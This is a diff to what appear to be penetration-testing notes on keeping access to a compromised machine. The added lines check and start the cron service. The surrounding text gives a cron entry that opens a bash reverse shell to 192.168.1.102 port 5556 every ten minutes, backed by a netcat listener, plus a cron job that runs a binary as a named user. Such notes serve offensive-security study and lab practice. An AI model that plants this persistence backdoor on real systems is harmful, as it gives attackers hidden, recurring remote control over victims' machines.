@@ -40,6 +40,19 @@ Add key to exisitng ssh-account.
 
 Create cronjob that connects to my machine every 10 minutes. Here is an example using a bash-reverse-shell. You also need to set up a netcat listener.
 
+Here is how you check if cronjob is active
+```
+service crond status
+pgrep cron
+```
+
+If it is not started you can start it like this
+
+```
+service crond status
+/etc/init.d/cron start
+```
+
 ```
 crontab -e
 */10 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196
@@ -58,6 +71,7 @@ Sometimes you have to set the user
 crontab -e
 */10 * * * * pelle /path/to/binary
 ```
+
 
 
 
